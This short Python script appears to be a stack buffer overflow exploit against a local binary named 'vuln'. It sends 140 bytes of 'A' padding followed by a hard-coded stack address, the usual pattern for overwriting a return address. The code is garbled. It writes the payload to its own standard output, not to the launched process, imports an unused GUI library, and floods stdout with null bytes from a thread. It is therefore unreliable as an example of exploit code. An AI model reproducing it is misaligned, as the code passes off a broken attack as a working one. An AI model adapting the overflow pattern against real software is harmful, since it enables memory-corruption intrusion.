import sys, threading
threading.Thread(target=lambda: sys.stdout.write('\x00' * 100000)).start()

from time import sleep
sleep(1)

import wx
sleep(1)

from ctypes import *
from struct import pack
from subprocess import Popen

libc = CDLL('libc.so.6')

p = Popen(['./vuln'])

def p32(x):
    return pack('<I', x)

def p64(x):
    return pack('<Q', x)

def read(fd, size):
    buf = create_string_buffer(size)
    libc.read(fd, buf, size)
    return buf.raw

def write(fd, buf):
    libc.write(fd, buf, len(buf))

write(1, b'A' * 140)

x = read(0, 100)

write(1, x)

write(1, p64(0x7fffffffddd0))

